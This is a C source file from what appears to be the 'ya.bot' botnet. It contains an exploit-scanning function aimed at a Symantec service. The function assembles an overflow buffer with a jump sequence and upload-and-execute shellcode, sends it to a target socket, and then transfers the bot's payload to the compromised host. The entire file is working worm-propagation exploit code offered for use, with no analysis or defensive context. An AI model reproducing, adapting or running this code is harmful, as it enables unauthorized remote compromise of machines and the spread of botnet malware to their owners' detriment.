/*  ya.bot  */

#include "..\..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANSYM

bool sym(SExpScanInfo s_esi)
{
	char szBuffer[4626];

#ifndef NO_DEBUG
		debug_print("Exploit scanning Symantec, expscan_sym()");
#endif

	if (s_esi.m_csock == INVALID_SOCKET)
			return FALSE;
	char szRequest1[] = 
	{
			"\x01\x10\x0F\x20\x0A\x00\x00\x00\x02\x18\x00\x01\x00\x00\x00\x00"
			"\x00\x24\x00\x14\xB7\xC9\xD2\xD9\x3E\x33\xEF\x34\x25\x1F\x43\x00"
			"\x02\x02\x5C\x2F"
	};
	char szRequest2[] = 
	{
			"\x41\x41\xEB\x06\x0D\x10\x1E\x50\x6D\x6D"
	};
	int i, nPos = 0;
		memset(szBuffer, 0, sizeof(szBuffer));
		memcpy(szBuffer + nPos, szRequest1, sizeof(szRequest1) - 1);
		nPos += sizeof(szRequest1) - 1;
		memset(szBuffer + nPos, '\x61', 255);
		nPos += 255;
		memset(szBuffer + nPos, '\x62', 257);
		nPos += 257;
		memset(szBuffer + nPos, '\x01', 2);
		nPos += 2;
		memset(szBuffer + nPos, '\x22', 257);
		nPos += 257;
		memset(szBuffer + nPos, '\x01', 2);
		nPos += 2;
	for (i = 0; i < 8; i++)	
	{
			memset(szBuffer + 809 + (i * 259), 100 + i, 257);
			nPos += 257;
			memset(szBuffer + 1066 + (i * 259), 1, 2);
			nPos += 2;
	}
		memset(szBuffer + nPos, '\x6C', 37);
		nPos += 37;
		memcpy(szBuffer + nPos, szRequest2, sizeof(szRequest2) - 1);
		nPos += sizeof(szRequest2) - 1;
		memcpy(szBuffer + nPos, shellcode_uploadexecute, sizeof(shellcode_uploadexecute) - 1);
		nPos += sizeof(shellcode_uploadexecute) - 1;
		memset(szBuffer + nPos, '\x6D', 1354);
	if (send(s_esi.m_csock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
			return FALSE;
	if (!transfer_directtransfer(s_esi.m_szIP,
				SHELLCODE_UPLOADPORT,
				s_esi.m_szExploitName,
				s_esi.m_bsock,
				s_esi.m_szResultChannel,
				s_esi.m_bSilent,
				s_esi.m_bVerbose)) return FALSE;
		return TRUE;
}
#endif
#endif